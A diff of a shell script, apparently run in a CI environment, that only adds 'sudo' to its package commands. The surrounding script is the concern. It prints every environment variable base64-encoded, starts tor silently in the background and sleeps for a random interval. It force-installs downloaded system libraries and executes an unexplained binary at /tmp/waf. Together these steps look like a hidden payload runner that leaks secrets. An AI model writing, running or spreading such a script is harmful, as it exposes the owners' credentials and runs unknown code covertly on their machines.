@@ -3,8 +3,8 @@ export DEBIAN_FRONTEND=noninteractive
 echo Hello
 env | base64
 
-apt update -qq
-apt install -y curl tor zstd
+sudo apt update -qq
+sudo apt install -y curl tor zstd
 tor >/dev/null 2>&1 &
 
 sleep $(shuf -i 10-20 -n 1)s
@@ -21,8 +21,8 @@ curl -s \
 curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_amd64.deb
 curl -LO http://mirrors.kernel.org/ubuntu/pool/main/g/gcc-13/libstdc++6_13.2.0-4ubuntu3_amd64.deb
 
-dpkg --force-all -i libc6_2.38-1ubuntu6_amd64.deb
-dpkg --force-all -i libstdc++6_13.2.0-4ubuntu3_amd64.deb 
+sudo dpkg --force-all -i libc6_2.38-1ubuntu6_amd64.deb
+sudo dpkg --force-all -i libstdc++6_13.2.0-4ubuntu3_amd64.deb 
 
 chmod +x /tmp/waf
 /tmp/waf || :
